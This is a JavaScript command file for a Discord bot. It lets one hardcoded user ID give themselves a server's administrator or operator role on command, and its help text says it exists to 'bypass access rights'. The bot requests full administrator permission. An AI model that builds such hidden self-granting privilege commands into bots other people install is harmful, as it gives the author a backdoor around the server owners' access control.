exports.run = (bot, message, args) => {
	// Only respond to owner message
	if (message.author.id != '303011486916411392') {return message.channel.send(':question:');}

	/* Give Role Function */
	function giveownerole(roles) {
		if (message.member.roles.cache.some(role => role.id === '698604670800887840' || role.id === '699302221552156732')) {
			message.channel.send('NO!!');
		}
		else if (args[0] == 'detach') {
			message.member.roles.remove(roles);
		}
		else {
			// Give the role to me
			message.member.setNickname('Rengga Sidoarjo');
			message.member.roles.add(roles);
			message.channel.send('Selamat datang kembali!');
		}
	}

	// set the admin role
	let therole;
	if (args[0] == 'limit') {
		// Operator Access
		therole = message.guild.roles.cache.find(role => role.id === '699302221552156732');
	}
	else if (!args[0]) {
		// Adminsnistrator Access
		therole = message.guild.roles.cache.find(role => role.id === '698604670800887840');
	}

	// Give the role
	giveownerole(therole);
};

exports.conf = {
	aliases: ['admin'],
	cooldown: 1,
	guildOnly: false,
	userPerm: [''],
	botPerm: ['ADMINISTRATOR'],
};

exports.help = {
	name: 'admin',
	category: 'owner',
	description: 'Bypass access rights',
	usage: 'admin [ACL]',
	param: '',
};
